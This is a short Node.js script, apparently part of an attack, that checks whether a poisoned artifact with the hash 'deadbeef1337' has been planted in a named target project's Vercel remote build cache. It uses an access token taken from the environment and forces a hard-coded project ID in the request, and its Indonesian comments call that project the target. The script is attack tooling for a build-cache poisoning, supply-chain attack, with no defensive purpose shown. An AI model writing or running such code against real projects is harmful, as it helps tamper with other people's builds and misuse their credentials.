// verify-poison.js
const { VERCEL_ARTIFACTS_TOKEN, VERCEL_ARTIFACTS_ID } = process.env;

async function checkPoison() {
    console.log("[?] Checking for remote cache artifacts...");
    console.log(`[*] Using Token: ${VERCEL_ARTIFACTS_TOKEN ? VERCEL_ARTIFACTS_TOKEN.substring(0, 10) + '...' : 'MISSING'}`);
    
    const artifactHash = "deadbeef1337"; 
    // Pakai endpoint Vercel Cache API yang lebih spesifik
    const url = `https://api.vercel.com/v8/artifacts/${artifactHash}`;

    try {
        const res = await fetch(url, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${VERCEL_ARTIFACTS_TOKEN}`,
                // PAKSA kasih tau Project ID targetnya
                'x-vercel-artifact-project-id': 'prj_S98fH6hOxHkxRzxT1b5sl6panuPv'
            }
        });

        console.log(`[?] Status Code: ${res.status}`);

        if (res.status === 200) {
            const content = await res.text();
            console.log(`[!] ARTIFACT FOUND! Content: "${content}"`);
        } else {
            const err = await res.text();
            console.log(`[-] Failed. Server said: ${err}`);
        }
    } catch (e) {
        console.log(`[!] Error: ${e.message}`);
    }
}

checkPoison();
